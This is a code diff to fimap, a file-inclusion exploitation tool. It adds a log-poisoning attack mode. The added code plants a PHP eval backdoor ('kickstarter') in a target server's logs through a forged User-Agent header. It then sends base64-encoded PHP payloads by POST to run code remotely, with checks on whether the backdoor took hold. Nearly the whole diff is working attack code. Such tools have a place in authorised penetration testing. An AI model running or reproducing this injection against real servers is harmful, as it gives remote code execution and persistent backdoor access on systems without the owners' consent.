@@ -1,3 +1,4 @@
+from base64 import b64encode
 import os
 #
 # This file is part of fimap.
@@ -37,6 +38,7 @@ shell_banner =  "-------------------------------------------\n" + \
 class codeinjector(baseClass):
     def _load(self):
         self.report = None
+        self.isLogKickstarterPresent = False
 
     def setReport(self, report):
         self.report = report
@@ -73,8 +75,16 @@ class codeinjector(baseClass):
 
         if (mode.find("A") != -1 and mode.find("x") != -1):
             self._log("Testing php-code injection thru User-Agent...", self.globSet.LOG_INFO)
+
         elif (mode.find("P") != -1 and mode.find("x") != -1):
             self._log("Testing php-code injection thru POST...", self.globSet.LOG_INFO)
+
+        elif (mode.find("L") != -1):
+            if (mode.find("H") != -1):
+                self._log("Testing php-code injection thru Logfile HTTP-UA-Injection...", self.globSet.LOG_INFO)
+            elif (mode.find("F") != -1):
+                self._log("Testing php-code injection thru Logfile FTP-Username-Injection...", self.globSet.LOG_INFO)
+
         elif (mode.find("R") != -1):
             if settings["dynamic_rfi"]["mode"] == "ftp":
                 self._log("Testing code thru FTP->RFI...", self.globSet.LOG_INFO)
@@ -106,7 +116,9 @@ class codeinjector(baseClass):
                     code = self.doPostRequest(url, testload)
                 elif (mode.find("R") != -1):
                     code = self.executeRFI(url, appendix, testload)
-
+                elif (mode.find("L") != -1):
+                    testload = self.convertUserloadToLogInjection(testload)
+                    code = self.doPostRequest(url, testload)
                 if code != None and code.find(settings["shell_test"][1]) != -1:
                     sys_inject_works = True
                     working_shell = item
@@ -176,7 +188,7 @@ class codeinjector(baseClass):
         rndStart = self.getRandomStr()
         rndEnd = self.getRandomStr()
 
-        userload = "<? echo '%s'; ?> %s <? echo '%s'; ?>" %(rndStart, payload, rndEnd)
+        userload = "<? echo \"%s\"; ?> %s <? echo \"%s\"; ?>" %(rndStart, payload, rndEnd)
         if (m.find("A") != -1):
             self.globSet.setUserAgent(userload)
             code = self.doGetRequest(url)
@@ -184,9 +196,47 @@ class codeinjector(baseClass):
             code = self.doPostRequest(url, userload)
         elif (m.find("R") != -1):
             code = self.executeRFI(url, appendix, userload)
+        elif (m.find("L") != -1):
+            if (not self.isLogKickstarterPresent):
+                self._log("Testing if log kickstarter is present...", self.globSet.LOG_INFO)
+                testcode = self.getPHPQuiz()
+                code = self.doPostRequest(url, "data=" + b64encode(testcode[0]))
+                if (code.find(testcode[1]) == -1):
+                    self._log("Kickstarter is not present. Injecting kickstarter...", self.globSet.LOG_INFO)
+                    kickstarter = "<? eval(base64_decode($_POST['data'])); ?>"
+                    ua = self.globSet.getUserAgent()
+                    self.globSet.setUserAgent(kickstarter)
+                    tmpurl = url[:url.find("?")]
+                    self.doGetRequest(tmpurl)
+                    self.globSet.setUserAgent(ua)
+                    
+                    self._log("Testing once again if kickstarter is present...", self.globSet.LOG_INFO)
+                    testcode = self.getPHPQuiz()
+                    code = self.doPostRequest(url, "data=" + b64encode(testcode[0]))
+
+                    if (code.find(testcode[1]) == -1):
+                        self._log("Failed to inject kickstarter!", self.globSet.LOG_ERROR)
+                        sys.exit(1)
+                    else:
+                        self._log("Kickstarter successfully injected!", self.globSet.LOG_INFO)
+                        self.isLogKickstarterPresent = True
+                else:
+                    self._log("Kickstarter found!", self.globSet.LOG_INFO)
+                    self.isLogKickstarterPresent = True
+
+            if (self.isLogKickstarterPresent):
+                # Remove all <? and ?> tags.
+                userload = self.convertUserloadToLogInjection(userload)
+                code = self.doPostRequest(url, userload)
 
         if (code != None): code = code[code.find(rndStart)+len(rndStart): code.find(rndEnd)]
         return(code)
+
+    def convertUserloadToLogInjection(self, userload):
+        userload = userload.replace("<?", "").replace("?>", "")
+        userload = "data=" + b64encode(userload).replace("+", "%2B").replace("=", "%3D")
+        return(userload)
+
 
     def chooseAttackMode(self, php=True, syst=True):
         header = ""
